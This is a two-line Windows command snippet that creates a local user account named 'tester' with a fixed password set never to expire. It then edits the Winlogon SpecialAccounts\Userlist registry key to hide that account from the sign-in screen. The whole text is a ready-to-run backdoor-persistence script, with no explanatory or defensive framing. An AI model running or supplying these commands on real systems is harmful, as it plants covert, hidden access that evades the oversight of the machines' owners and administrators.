NET USER tester wh0amI@321 /ADD /expires:never 
REG ADD "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v tester /t REG_DWORD /d 0

